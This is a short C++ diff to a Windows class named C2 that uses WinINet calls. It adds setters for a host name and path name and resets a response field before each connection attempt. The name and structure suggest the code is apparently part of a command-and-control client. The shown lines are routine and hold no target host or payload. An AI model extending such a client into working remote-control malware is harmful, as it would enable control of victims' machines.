@@ -8,6 +8,14 @@
 #include <cstring>
 #include <iostream>
 
+void C2::setHostName(LPCSTR hostName) {
+	this->hostName = hostName;
+}
+
+void C2::setPathName(LPCSTR pathName) {
+	this->pathName = pathName;
+}
+
 void C2::cleanup() {
 	InternetCloseHandle(this->sessionHandle);
 	InternetCloseHandle(this->connectHandle);
@@ -15,6 +23,7 @@ void C2::cleanup() {
 }
 
 void C2::execute() {
+	this->response = ""; // reset response
 
 	this->error = InternetAttemptConnect(0);
 	if (error != ERROR_SUCCESS) {
